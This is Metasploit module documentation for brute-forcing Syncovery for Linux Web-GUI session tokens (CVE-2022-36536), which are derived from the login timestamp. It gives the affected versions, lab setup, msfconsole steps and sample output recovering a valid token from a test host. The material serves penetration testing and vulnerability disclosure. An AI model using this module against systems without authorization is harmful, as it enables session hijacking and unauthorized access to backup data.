## Vulnerable Application
[Syncovery For Linux with Web-GUI](https://www.syncovery.com/download/linux/)

This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI
by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s).
By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops.
The vulnerability exists, because in Syncovery session tokens are basically just `base64(m/d/Y H:M:S)` at the time
of the login instead of a random token.
If a user does not logout, the token stays valid until next reboot. Note that the mobile version of the WEB GUI
as well as the obsolete branch 8 of Syncovery do not have a logout button.

This affects Syncovery for Linux before v9.48j and all versions of the obsolete branch 8.

### Setup

Installing a vulnerable version of Syncovery for Linux to test this vulnerability is quite easy.
Download a vulnerable version of Syncovery for Linux: https://www.syncovery.com/release/Syncovery-9.47a-amd64.deb
Install it and once the server is up, you can access it on port 8999 for testing...

## Authors

- Jan Rude (mgm security partners GmbH)

## Platforms

- Unix

## Verification Steps

1. `use auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536`
2. `set RHOSTS <TARGET HOSTS>`
3. `run`
5. On success you should get a valid token.

## Options

### TARGETURI
The path to Syncovery login mask.

### PORT
The (TCP) target port on which Syncovery is running. By default port 8999 is used for HTTP and port 8943 is used for HTTPS.

## Scenarios

### Syncovery for Linux with default credentials

```
msf6 > use auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536
msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > set rhosts 192.168.178.26
rhosts => 192.168.178.26
msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > options

Module options (auxiliary/scanner/http/syncovery_linux_token_cve_2022_36536):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DAYS       1                yes       Check today and last X day(s) for valid session token
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.178.26   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8999             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                no        The path to Syncovery
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > check
[+] 192.168.178.26:8999 - The target is vulnerable.
msf6 auxiliary(scanner/http/syncovery_linux_token_cve_2022_36536) > run

[*] 192.168.178.26:8999 - Starting Brute-Forcer
[+] 192.168.178.26:8999 - Valid token found: 'MDkvMDYvMjAyMiAxMzo0NDoxMg=='
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Limitations
In Syncovery v9.x tokens get invalidated after the user logs out. In this case no valid token can be found.
